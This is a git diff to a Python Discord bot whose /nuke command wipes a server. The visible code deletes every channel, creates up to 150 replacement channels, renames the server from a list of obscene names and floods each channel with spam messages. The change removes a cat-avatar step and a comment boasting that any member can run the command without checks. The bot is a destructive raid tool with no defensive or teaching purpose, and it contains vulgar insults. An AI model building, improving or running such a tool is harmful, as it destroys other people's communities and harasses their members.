@@ -3,8 +3,6 @@ from discord.ext import commands
 import os
 from dotenv import load_dotenv
 import asyncio
-from PIL import Image, ImageDraw
-from io import BytesIO
 
 load_dotenv()
 
@@ -31,7 +29,7 @@ async def on_ready():
 async def start(interaction: discord.Interaction):
     await interaction.response.send_message("✅ Bot is running and online! 24/7 active!")
 
-# Server name and avatar
+# Server names
 FUNNY_NAMES = [
     "🍆 LOUDA LASSAN",
     "💦 MUTH BAZI",
@@ -77,33 +75,6 @@ SPAM_MESSAGES = [
     "🚨 ALL SYSTEMS DOWN 🚨\n💀 THE NUKE IS ACTIVE 💀\n☠️ EVERYONE IS AFFECTED ☠️\n🔥 NO ESCAPE POSSIBLE 🔥",
 ]
 
-# Create cat avatar image
-def create_cat_avatar():
-    img = Image.new('RGB', (100, 100), color='#FFB366')
-    draw = ImageDraw.Draw(img)
-    
-    # Draw face
-    draw.ellipse([10, 15, 90, 85], fill='#FFB366', outline='#000000', width=2)
-    
-    # Draw ears
-    draw.polygon([(20, 20), (25, 5), (35, 20)], fill='#FFB366', outline='#000000')
-    draw.polygon([(65, 20), (75, 5), (80, 20)], fill='#FFB366', outline='#000000')
-    
-    # Draw eyes
-    draw.ellipse([25, 35, 35, 45], fill='#000000')
-    draw.ellipse([65, 35, 75, 45], fill='#000000')
-    
-    # Draw nose
-    draw.polygon([(48, 52), (50, 58), (52, 52)], fill='#FF69B4')
-    
-    # Draw mouth
-    draw.arc([(40, 55), (60, 70)], 0, 180, fill='#000000', width=2)
-    
-    img_byte_arr = BytesIO()
-    img.save(img_byte_arr, format='PNG')
-    img_byte_arr.seek(0)
-    return img_byte_arr.getvalue()
-
 # Confirmation view with buttons
 class ConfirmView(discord.ui.View):
     def __init__(self, timeout=60):
@@ -127,9 +98,8 @@ class ConfirmView(discord.ui.View):
         await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
         self.stop()
 
-# /nuke command - Delete all channels, create new ones, rename server, change avatar, spam
-# ✅ NO CHECKS - ALL MEMBERS CAN USE
-@bot.tree.command(name="nuke", description="Complete server nuke - delete, create, rename, avatar, spam")
+# /nuke command - Delete all channels, create new ones, rename server, spam
+@bot.tree.command(name="nuke", description="Complete server nuke - delete, create, rename, spam")
 async def nuke(interaction: discord.Interaction):
     await interaction.response.defer()
     
@@ -218,20 +188,8 @@ async def nuke(interaction: discord.Interaction):
         
         await asyncio.sleep(1)
         
-        # STEP 4: Change server avatar
-        try:
-            cat_avatar = create_cat_avatar()
-            await guild.edit(icon=cat_avatar)
-            await interaction.followup.send(f"✅ **STEP 4:** Server avatar changed to cat! 🐱")
-            print("Server avatar changed to cat")
-        except Exception as e:
-            print(f"Failed to change avatar: {e}")
-            await interaction.followup.send(f"⚠️ Could not change avatar: {e}")
-        
-        await asyncio.sleep(1)
-        
-        # STEP 5: Spam messages in all new channels
-        await interaction.followup.send(f"🔄 **STEP 5:** Spamming messages to all {created_count} channels...")
+        # STEP 4: Spam messages in all new channels
+        await interaction.followup.send(f"🔄 **STEP 4:** Spamming messages to all {created_count} channels...")
         
         total_spam_count = 0
         
@@ -256,8 +214,7 @@ async def nuke(interaction: discord.Interaction):
             f"✅ Deleted: {deleted_count} channels\n"
             f"✅ Created: {created_count}/150 channels\n"
             f"✅ Spam Messages: {total_spam_count} sent\n"
-            f"✅ Server Name: {new_name}\n"
-            f"✅ Server Avatar: Cat Image 🐱\n\n"
+            f"✅ Server Name: {new_name}\n\n"
             f"🔥 SERVER COMPLETELY NUKED! 🔥"
         )
         
